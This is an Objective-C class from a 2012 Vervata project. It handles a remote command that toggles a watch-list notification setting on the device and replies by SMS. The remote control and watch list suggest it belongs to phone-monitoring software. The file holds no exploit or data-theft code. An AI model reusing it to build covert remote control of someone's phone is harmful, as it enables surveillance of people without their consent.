/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  EnableWatchNotificationProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "EnableWatchNotificationProcessor.h"
#import "PrefWatchList.h"
#import "Preference.h"

@interface EnableWatchNotificationProcessor (PrivateAPI)
- (BOOL) isValidFlag;
- (void) enableWatchNotification;
- (void) enableWatchNotificationException;
- (void) sendReplySMS;
@end

@implementation EnableWatchNotificationProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the EnableWatchNotificationProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (EnableWatchNotificationProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"EnableWatchNotificationProcessor--->initWithRemoteCommandData...");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the EnableWatchNotificationProcessor
 - Argument list and description: 
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"EnableWatchNotificationProcessor--->doProcessingCommand");
	if ([self isValidFlag])	[self enableWatchNotification];
	else [self enableWatchNotificationException];
	
}


#pragma mark EnableWatchNotificationProcessor PrivateAPI Methods

/**
 - Method name: enableWatchNotification
 - Purpose:This method is used to process Enable watch notification
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (void) enableWatchNotification {
	DLog (@"EnableWatchNotificationProcessor--->enableWatchNotification");
	NSUInteger flagValue=[[[mRemoteCmdData mArguments] objectAtIndex:2] intValue];
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefWatchList *prefWatchList = (PrefWatchList *)[prefManager preference:kWatch_List];
	[prefWatchList setMEnableWatchNotification:flagValue];
	[prefManager savePreferenceAndNotifyChange:prefWatchList];
	[self sendReplySMS];
}


/**
 - Method name: isValidFlag
 - Purpose:This method is used to validate the Arguments
 - Argument list and description: 
 - Return description:isValidArguments (BOOL)
*/

- (BOOL) isValidFlag {
	DLog (@"EnableWatchNotificationProcessor--->isValidFlag")
	BOOL isValid=NO;
	NSArray *args=[mRemoteCmdData mArguments];
	if ([args count]>2) isValid=[RemoteCmdProcessorUtils isZeroOrOneFlag:[args objectAtIndex:2]];	
	return isValid;
}

/**
 - Method name: enableWatchNotificationException
 - Purpose:This method is invoked when  when enable WatchNotification process failed. 
 - Argument list and description: No Argument
 - Return description: No Return
*/

- (void) enableWatchNotificationException {
	DLog (@"EnableWatchNotificationProcessor--->enableWatchNotificationException")
	FxException* exception = [FxException exceptionWithName:@"enableWatchNotificationException" andReason:@"Enable watch notification error"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description:No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"EnableWatchNotificationProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *enableWatchNotificationMessage=NSLocalizedString(@"kEnableWatchNumber", @"");
	if ([[[mRemoteCmdData mArguments] objectAtIndex:2] intValue]==1) 
		enableWatchNotificationMessage=[enableWatchNotificationMessage stringByAppendingString:NSLocalizedString(@"kEnabled", @"")];
	else 
    	enableWatchNotificationMessage=[enableWatchNotificationMessage stringByAppendingString:NSLocalizedString(@"kDisabled", @"")];
	
	enableWatchNotificationMessage=[messageFormat stringByAppendingString:enableWatchNotificationMessage];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:enableWatchNotificationMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:enableWatchNotificationMessage];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to handle memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[super dealloc];
}

@end
